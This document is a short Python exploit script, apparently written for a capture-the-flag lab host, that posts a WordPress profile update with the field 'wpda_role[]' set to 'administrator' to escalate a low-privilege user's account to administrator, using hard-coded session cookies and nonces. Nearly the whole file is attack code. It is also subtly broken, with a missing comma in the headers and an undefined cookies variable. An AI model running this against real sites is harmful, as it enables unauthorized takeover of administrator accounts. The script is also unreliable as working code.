import requests

# === Configuration ===
target_url = "http://breakme.thm/wordpress/wp-admin/profile.php"

# Separate cookie values into a dictionary
 
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Referer": target_url,
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://breakme.thm",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1"
    "Cookie": "wordpress_c2f477f926e80f214cb1809067df0f1a=bob%7C1755616655%7CrbjjyLJN75YyF7B9D9ogi97GDuG6liPhWwBqfBvAuI6%7C770fc4729d61798ccf65511024e942c02c7731f514427f7f06685e932643a379; wordpress_logged_in_c2f477f926e80f214cb1809067df0f1a=bob%7C1755616655%7CrbjjyLJN75YyF7B9D9ogi97GDuG6liPhWwBqfBvAuI6%7C348040d776097dcd8a22b9dc07dd5bc8595dce0a7c4d5b400b27189c9615ab45; wordpress_test_cookie=WP%20Cookie%20check; wp-settings-time-2=1755440871; wp-settings-2=mfold%3Do"
}

# === POST data for privilege escalation ===
data = {
    "_wpnonce": "56797fdbb0",
    "_wp_http_referer": "/wordpress/wp-admin/profile.php",
    "from": "profile",
    "checkuser_id": "2",
    "color-nonce": "edc6e95f7c",
    "admin_color": "modern",
    "admin_bar_front": "1",
    "first_name": "bob",
    "last_name": "bob",
    "nickname": "l0n3m4n",
    "display_name": "bob bob",
    "email": "bob@localhost.com",
    "url": "",
    "description": "",
    "pass1": "",
    "pass2": "",
    "action": "update",
    "user_id": "2",
    "submit": "Update Profile",
    "wpda_role[]": "administrator" # <--- previlige attempt
}

# === Send the request ===
print("[*] Sending profile update request...")

session = requests.Session()
response = session.post(target_url, headers=headers, cookies=cookies, data=data)

# === Check response ===
if "Profile updated" in response.text or "wpda_role" in response.text:
    print("[+] Privilege escalation attempted successfully. Check if user is now admin.")
else:
    print("[-] Request failed or was blocked.")
    print(f"Status: {response.status_code}")
    print(response.text[:500])  # Output part of the response for debugging
